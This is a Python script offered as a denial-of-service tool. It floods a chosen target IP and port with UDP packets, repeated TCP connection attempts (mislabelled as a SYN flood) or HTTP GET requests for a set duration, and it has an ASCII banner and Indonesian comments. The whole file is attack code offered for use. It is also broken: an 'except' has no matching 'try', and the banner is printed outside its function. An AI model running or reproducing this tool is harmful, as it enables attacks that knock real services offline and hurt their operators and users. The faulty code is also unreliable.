import os
import socket
import threading
import time
import random
import sys
import requests
import colorama
from colorama import Fore
import aiohttp
import asyncio

colorama.init(autoreset=True)

def display_banner(): #logo program.
    banner_text = f"""
{Fore.LIGHTYELLOW_EX}▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒┌───╮▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╭╮▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒└────╮╭───╮▒┌───╮▒╭───╮▒││▒▒╭╮▒▒╭────╮╭╮▒▒▒╭╮╭╮╭──╮▒╭╮▒▒▒╭╮╭╮▒▒
▒▒▒▒▒▒▒│││╭───╮└────╮╰────╮││▒╭╯|▒▒│╭───╯││▒▒▒│││╰╯╭──╮││▒▒▒││││▒▒
▒▒▒▒▒▒▒│││╰──╯│▒▒▒▒││╭───╯││╰─╯╭╯▒▒│╰───╮││▒▒▒│││╭─╯▒││││▒▒▒││││▒▒
▒▒╭╮▒▒▒│││┌───╯▒▒▒▒│││╭──╮││╭─╮╰╮▒▒╰───╮|││▒▒▒││││▒▒▒│││╰───╯│││▒▒
▒▒|╰────╯|╰──╮╭╮▒▒▒││╰───╯|││▒╰╮|▒▒╭────╯│╰────╯││▒▒▒││╰────╮│││▒▒
▒▒╰────╯▒╰───╯|╰────╯▒╰───╯╰╯▒▒╰╯▒▒╰───╯▒╰────╯▒╰╯▒▒▒╰╯╭─────╯╰╯▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒╰────╯▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╰────╯▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
                          {Fore.LIGHTRED_EX}UDP DoS | TCP SYN | HTTP Flood
"""
print(banner_text)
def parse_arguments(): 
    # Mengurai dan memvalidasi argumen baris perintah.
    if len(sys.argv) != 5:
        print(f"""
        {Fore.LIGHTYELLOW_EX}Use » python {os.path.basename(__file__)} [target] [port] [duration] [attack_type]
        {Fore.LIGHTGREEN_EX} Type Attacks »
        {Fore.LIGHTGREEN_EX} UDP           
        {Fore.LIGHTRED_EX} TCP  
        {Fore.LIGHTGREEN_EX} HTTP              
        """)
        sys.exit(1)
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    attack_type = sys.argv[4].upper()
    if attack_type not in ['UDP', 'TCP', 'HTTP']:
        print("Invalid attack type. Valid values: UDP, TCP, HTTP")
        sys.exit(1)
    return target_ip, target_port, duration, attack_type

def check_target_availability(target_ip, target_port): 
    # Memeriksa ketersediaan target sebelum memulai serangan.
    socket.create_connection((target_ip, target_port), timeout=5)
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} Target available: {Fore.LIGHTGREEN_EX}{target_ip}:{target_port}")
    return True
except socket.error:
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} Target unavailable: {Fore.LIGHTRED_EX}{target_ip}:{target_port}")
    return False

def udp_attack(target_ip, target_port, duration): 
    # Melakukan serangan UDP pada target yang ditentukan.
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_data = random._urandom(65500)
    end_time = time.time() + duration
    packets_sent = 0
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack has on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")

    while time.time() < end_time:
        udp_socket.sendto(packet_data, (target_ip, target_port))
        packets_sent += 1
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack completed. Total packets sent: {Fore.LIGHTGREEN_EX}{packets_sent}.")

def tcp_syn_attack(target_ip, target_port, duration):
    # Memulai serangan TCP SYN pada target yang ditentukan.
    end_time = time.time() + duration
    packets_sent = 0
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} TCP SYN attack on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")

    while time.time() < end_time:
        tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            tcp_socket.connect((target_ip, target_port))
        except socket.error:
            pass
        tcp_socket.close()
        packets_sent += 1
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX}» TCP SYN attack completed. Total connection attempts: {Fore.LIGHTGREEN_EX}{packets_sent}.")

async def http_flood_attack(target_ip, target_port, duration): 
    # Melakukan serangan HTTP Flood pada target yang ditentukan.
    end_time = time.time() + duration
    requests_sent = 0
    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} HTTP Flood attack started on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")

    async with aiohttp.ClientSession() as session:
        while time.time() < end_time:
            try:
                async with session.get(f"http://{target_ip}:{target_port}") as response:
                    requests_sent += 1
            except aiohttp.ClientError:
                pass

    print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} HTTP Flood attack completed. Total requests sent: {Fore.LIGHTGREEN_EX}{requests_sent}.")

if __name__ == "__main__":
    display_banner()
    target_ip, target_port, duration, attack_type = parse_arguments()

    if not check_target_availability(target_ip, target_port):
        sys.exit(1)

    if attack_type == 'UDP':
        udp_attack(target_ip, target_port, duration)
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack has on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
    
    if attack_type == 'TCP':
        tcp_syn_attack(target_ip, target_port, duration)
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} TCP SYN attack on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
        
    if attack_type == 'HTTP':
        asyncio.run(http_flood_attack(target_ip, target_port, duration))
        print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} HTTP Flood attack started on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
        
        
